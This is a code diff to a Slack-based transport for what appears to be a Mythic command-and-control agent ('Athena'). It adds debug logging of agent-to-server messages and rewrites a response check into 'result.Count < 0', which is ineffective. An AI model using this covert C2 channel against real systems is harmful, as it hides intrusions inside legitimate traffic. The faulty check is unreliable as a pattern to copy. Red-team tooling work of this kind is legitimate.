@@ -16,11 +16,9 @@ using Slack.NetStandard.WebApi.Files;
 using Slack.NetStandard.Messages.Blocks;
 using Slack.NetStandard.WebApi.Conversations;
 using System.Text.Json;
-using Athena.Models.Mythic.Checkin;
 using System.Text.Json.Serialization;
-using static System.Collections.Specialized.BitVector32;
-using Section = Slack.NetStandard.Messages.Blocks.Section;
 using System.Net.Http.Headers;
+using System.Diagnostics;
 
 namespace Athena
 {
@@ -115,8 +113,10 @@ namespace Athena
         }
         public async Task<string> Send(string json)
         {
+            Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
             try
             {
+
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -128,7 +128,7 @@ namespace Athena
 
                 int i = 0;
 
-
+                Debug.WriteLine($"[{DateTime.Now}] Writing message to slack channel.");
                 while (!await SendSlackMessage(json))
                 {
                     if (i == this.messageChecks)
@@ -143,8 +143,9 @@ namespace Athena
                 i = 0;
 
                 //Give the server a second to respond.
-
+                Debug.WriteLine($"[{DateTime.Now}] Checking for responses.");
                 result = await GetSlackMessages();
+                Debug.WriteLine($"[{DateTime.Now}] Received {result.Count} responses.");
 
                 //We should only be getting one message back so this is likely unneeded also
                 //But just in case I ever need it later, use LINQ to select unique messages from the result in the event we accidentally receive double messages.
@@ -158,31 +159,33 @@ namespace Athena
                 string strRes;
                 //Take only the most recent response in case some messages got left over.
                 //This may cause issues in the event I need to implement slack message chunking, but with current max values it should be fine.
-                if (result.FirstOrDefault().Value is not null)
-                {
-                    strRes = result.FirstOrDefault().Value.message;
-                }
-                else
+                if(result.Count < 0)
                 {
                     return String.Empty;
                 }
 
+                strRes = result.First().Value.message;
+
                 //Delete the messages we've read successfully and indicate we're not waiting for a response anymore
                 DeleteMessages(result.Keys.ToList());
-                
+
                 if (this.encrypted)
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
                     return this.crypt.Decrypt(strRes);
                 }
 
                 if (!string.IsNullOrEmpty(strRes))
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
                     return (await Misc.Base64Decode(strRes)).Substring(36);
                 }
+
                 return String.Empty;
             }
             catch (Exception e)
             {
+                Debug.WriteLine($"[{DateTime.Now}] Error in Slack send: {e}");
                 return String.Empty;
             }
         }
@@ -191,6 +194,7 @@ namespace Athena
             MythicMessageWrapper msg;
             if (data.Count() > 3850)
             {
+                Debug.WriteLine($"[{DateTime.Now}] Uploading with attachment.");
                 msg = new MythicMessageWrapper()
                 {
                     sender_id = this.agent_guid,
@@ -209,11 +213,12 @@ namespace Athena
                 };
 
                 var res = await this.client.Files.Upload(request);
-
+                Debug.WriteLine($"[{DateTime.Now}] Upload Success Status: {res.OK}");
                 return res.OK;
             }
             else
             {
+                Debug.WriteLine($"[{DateTime.Now}] Uploading as raw message.");
                 var request = new PostMessageRequest
                 {
                     Channel = this.channel,
@@ -235,7 +240,7 @@ namespace Athena
 
 
                 var result = await client.Chat.Post(request);
-
+                Debug.WriteLine($"[{DateTime.Now}] Message Post Success Status: {result.OK}.");
                 return result.OK;
 
             }
@@ -271,6 +276,7 @@ namespace Athena
 
                 if (!conversationsResponse.OK)
                 {
+                    Debug.WriteLine($"[{DateTime.Now}] Error from slack: {conversationsResponse.Error}");
                     return messages;
                 }
 
@@ -288,8 +294,10 @@ namespace Athena
                     {
                         mythicMessage = JsonSerializer.Deserialize<MythicMessageWrapper>(message.Text, MythicMessageWrapperJsonContext.Default.MythicMessageWrapper);
                     }
-                    catch (JsonException)
+                    catch (JsonException e)
                     {
+                        Debug.WriteLine($"[{DateTime.Now}] Error deserializing message: {e}");
+                        Debug.WriteLine($"[{DateTime.Now}] Message: {message.Text}");
                         continue;
                     }
 
@@ -297,7 +305,8 @@ namespace Athena
                     {
                         continue;
                     }
-
+                    Debug.WriteLine($"[{DateTime.Now}] Found a message designated for us.");
+                    
                     if (String.IsNullOrEmpty(mythicMessage.message))
                     {
                         using (var requestMessage = new HttpRequestMessage(HttpMethod.Get, message.Files.First().UrlPrivateDownload))
@@ -310,9 +319,14 @@ namespace Athena
                             {
                                 mythicMessage.message = await res.Content.ReadAsStringAsync();
                             }
+                            else
+                            {
+                                Debug.WriteLine($"[{DateTime.Now}] Error getting file contents: {res.StatusCode}");
+                            }
                         }
                     }
-
+                    
+                    Debug.WriteLine($"[{DateTime.Now}] Adding message to queue.");
                     messages.Add(message.Timestamp, mythicMessage);
                 }
 
@@ -321,7 +335,7 @@ namespace Athena
                     break;
                 }
             }
-
+            Debug.WriteLine($"[{DateTime.Now}] Returning {messages.Count} messages.");
             return messages;
         }
     }
